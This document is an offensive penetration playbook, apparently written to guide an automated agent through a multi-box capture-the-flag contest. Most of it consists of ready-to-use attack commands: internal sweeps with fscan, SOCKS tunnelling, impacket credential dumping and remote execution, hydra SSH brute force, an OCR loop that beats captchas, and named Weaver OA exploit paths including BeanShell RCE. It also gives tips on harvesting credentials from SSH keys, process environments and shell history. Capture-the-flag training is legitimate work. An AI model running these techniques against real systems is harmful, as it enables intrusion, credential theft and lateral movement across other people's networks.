# Multi-stage penetration playbook (weight 20% — go deep)

Chain stages; persist EVERY credential/artifact in notes as facts. Submit each
stage's flag immediately — b-* gives partial credit (14 flags across 3 boxes).

1. **Foothold**: full port scan (nmap -p- top first), service banners; exploit
   the weakest service (web first — use web playbook; then redis/ftp/smb).
2. **Enum locally**: `id; sudo -l; find / -perm -4000; cat /etc/crontab;
   history; .ssh/; env; capsh --print`; look for flag1 and pivot creds.
3. **Pivot**: enumerate internal nets (`ip a; arp -a; cat /etc/hosts`).
   - `fscan -h <internal-range> -p 22,80,443,135,445,3306,3389,6379,7001 -m 2`
     sweeps live hosts + services fast and cracks common weak口令 inline.
   - Tunnel: `ssh -N -D 1080 user@foothold`, then point
     `/etc/proxychains4.conf` at `socks5 127.0.0.1 1080` and run every
     follow-up tool as `proxychains4 <cmd>` so it rides the tunnel.
   - re-scan internal ranges; internal apps are often unpatched/trusting.
4. **Lateral movement (impacket is baked in)** — with creds or NTLM hashes:
   - dump: `secretsdump.py 'dom/user:pass@DC'` or `-hashes :<ntlm> user@host`
   - exec: `wmiexec.py 'user:pass@target'` (quieter) / `psexec.py` / `smbexec.py`
   - browse: `smbclient.py user:pass@target` → shares, then hunt flags/configs
   - Kerberos: `getTGT.py` then `export KRB5CCNAME=...` + `-k -no-pass` variants
5. **Privilege escalation**: sudo misconfig (GTFOBins), SUID, writable cron,
   capabilities, kernel exploit ONLY as last resort.
6. **Credential reuse**: reuse found passwords/keys across every service & host.
   For SSH brute force, harvest a user list first, then
   `hydra -L users.txt -P /opt/seclists/Passwords/...rockyou... ssh://tgt -t 4`.
7. **Captchas (b-02)**: if a login/form is captcha-gated, OCR it locally —
   tesseract is baked in. Loop automatically (captcha refreshes each try):
   ```
   curl -s -c cj "$BASE/captcha" -o cap.png
   tesseract cap.png stdout --psm 7 \
     -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz
   ```
   Noisy image? Preprocess with PIL (grayscale → threshold → denoise) first.
8. Multiple flags: one per stage (foothold / internal / root). After each flag
   keep going while remaining>0.

## Product quick-hits (killchain footholds)
- Weaver (泛微) OA (b-02): fingerprint version, then probe the classic leads —
  `/weaver/bsh.servlet.BshServlet` (BeanShell RCE), WorkflowServiceXmlRpc
  (SSRF), `/mobile/DBconfigReader.jsp` (DB-config info leak), `/mobile/` API
  surface. The admin backend box often opens SSH — reuse harvested creds there.

## Field notes
- Round-0: DECOY subnets exist (10.0.175.x was a trap; validate targets against
  the description's real addresses). Foothold containers may have ONLY nc:
  harvest creds from the filesystem (/root/.ssh, /proc/*/environ, history, app
  configs) and pivot via bash /dev/tcp or SSRF proxies; internal Go apps answer
  to /debug/pprof. Cracked-looking md5 hashes: finish the crack (small wordlist
  + rules) before moving on — they gate the next stage.
